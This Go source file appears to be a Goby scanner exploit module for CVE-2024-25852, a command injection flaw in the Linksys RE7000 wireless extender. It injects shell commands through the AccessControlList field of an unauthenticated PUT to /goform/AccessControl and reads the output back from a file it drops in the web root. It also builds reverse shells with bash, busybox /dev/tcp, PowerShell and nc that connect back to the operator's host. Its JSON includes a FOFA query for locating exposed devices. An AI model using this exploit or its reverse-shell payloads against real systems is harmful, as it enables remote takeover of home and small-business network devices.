package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Linksys-RE7000 Wireless Extender /goform/AccessControl Command Execution Vulnerability (CVE-2024-25852)",
    "Description": "<p>Linksys is Belkin's division of home and small business networking products, with a focus on broadband and wireless routers. The RE7000 is a new dual-band AC1900 wireless extender from Linksys with seamless roaming.The Linksys RE7000 Wireless Extender has a command execution vulnerability in the \"AccessControlList\" parameter of the Access Control function point. An unauthenticated, remote attacker can exploit this vulnerability to gain device administrator privileges.</p>",
    "Product": "Belkin Flag",
    "Homepage": "https://www.belkin.com/cn/",
    "DisclosureDate": "2024-11-06",
    "PostTime": "2024-11-15",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "body=\"/goform/langSwitch\" && body=\"language_select\"",
    "GobyQuery": "body=\"/goform/langSwitch\" && body=\"language_select\"",
    "Level": "3",
    "Impact": "<p>1. Inherit the permissions of the Web server program to execute system commands </p><p> 2. Inherit the web server permission and read the file  </p><p> 3. Bounce shell  </p><p> 4. Control the entire website  </p><p> 5. Control the entire server</p>",
    "Recommendation": "<p>1. Try not to execute external commands.</p><p> 2. Use custom functions or libraries to replace the functions of external commands.</p><p>3. The manufacturer has released a fixed version, pay attention to <a href=\"https://www.belkin.com/cn/\">https://www.belkin.com/cn/</a></p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/Linksys/Linksys-RE7000%E6%97%A0%E7%BA%BF%E6%89%A9%E5%B1%95%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-25852).md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "ls",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-25852"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "Linksys-RE7000无线扩展器 /goform/AccessControl 命令执行漏洞（CVE-2024-25852）",
            "Product": "贝尔金旗",
            "Description": "<p>Linksys是贝尔金旗下一个销售家用与小型业务用网络产品的部门，主要经营宽带与&nbsp;无线路由器&nbsp;。RE7000是Linksys推出的一款新型双频AC1900无线扩展器，具有无缝漫游功能。<br>Linksys RE7000无线扩展器在&nbsp;访问控制&nbsp;功能点的“AccessControlList”参数中存在命令执行漏洞。未经身份验证的远程攻击者可以利用该漏洞获取设备管理员权限。<br></p>",
            "Recommendation": "<p>1、尽量不要执行外部命令。&nbsp;</p><p>2、使用自定义函数或者函数库来代替外部命令的功能。<br></p><p>3、该厂商已发布修复版本，关注<a href=\"https://www.belkin.com/cn/\">https://www.belkin.com/cn/</a></p>",
            "Impact": "<p>1、继承Web 服务器程序权限，去执行系统命令&nbsp;</p><p>2、继承Web 服务器权限，读取文件&nbsp;</p><p>3、反弹Shell&nbsp;</p><p>4、控制整个网站&nbsp;</p><p>5、控制整个服务器<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Linksys-RE7000 Wireless Extender /goform/AccessControl Command Execution Vulnerability (CVE-2024-25852)",
            "Product": "Belkin Flag",
            "Description": "<p>Linksys is Belkin's division of home and small business networking products, with a focus on broadband and wireless routers. The RE7000 is a new dual-band AC1900 wireless extender from Linksys with seamless roaming.The Linksys RE7000 Wireless Extender has a command execution vulnerability in the \"AccessControlList\" parameter of the Access Control function point. An unauthenticated, remote attacker can exploit this vulnerability to gain device administrator privileges.<br></p>",
            "Recommendation": "<p>1. Try not to execute external commands.</p><p>&nbsp;2. Use custom functions or libraries to replace the functions of external commands.<br></p><p>3. The manufacturer has released a fixed version, pay attention to <a href=\"https://www.belkin.com/cn/\">https://www.belkin.com/cn/</a></p>",
            "Impact": "<p>1. Inherit the permissions of the Web server program to execute system commands&nbsp;</p><p>&nbsp;2. Inherit the web server permission and read the file&nbsp;&nbsp;</p><p>&nbsp;3. Bounce shell&nbsp;&nbsp;</p><p>&nbsp;4. Control the entire website&nbsp;&nbsp;</p><p>&nbsp;5. Control the entire server<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9973"
}`

	setPayloadRequestHashQgLPm6r9 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//漏洞url地址
		vulPath := "/goform/AccessControl"
		postRequestConfig := httpclient.NewRequestConfig("PUT", vulPath)
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		tmpFileName := goutils.RandomHexString(6) + ".txt"
		postRequestConfig.Data = "{\"AccessPolicy\":\"0\",\"AccessControlList\":\"`" + command + ">/etc_ro/lighttpd/RE7000_www/" + tmpFileName + "`\"}"
		//请求头
		head := map[string]string{
			"Accept-Encoding": "gzip, deflate, br",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		}
		for headName, headValue := range head {
			postRequestConfig.Header.Store(headName, headValue)
		}
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil || response == nil {
			return "", "", err
		}
		//准备访问上传文件结果 第二次发包
		commandResult := ""
		GetrequestConfig := httpclient.NewGetRequestConfig("/" + tmpFileName)
		GetrequestConfig.VerifyTls = false
		GetrequestConfig.FollowRedirect = false
		Getresp, err := httpclient.DoHttpRequest(hostInfo, GetrequestConfig)
		if err != nil || Getresp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", vulPath, err
		}
		commandResult = Getresp.RawBody

		//删除文件 第三次发包
		payload := "{\"AccessPolicy\":\"0\",\"AccessControlList\":\"`rm -f /etc_ro/lighttpd/RE7000_www/" + tmpFileName + "`\"}"
		postRequestConfig.Data = payload
		httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		return commandResult, vulPath, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			text := goutils.RandomHexString(6)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashQgLPm6r9

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			ReverseTcpByBusyBox := func(rp string) string {
				return fmt.Sprintf("busybox sh -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", godclient.GetGodServerIP(), rp)
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"ByBusyBox":          ReverseTcpByBusyBox,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
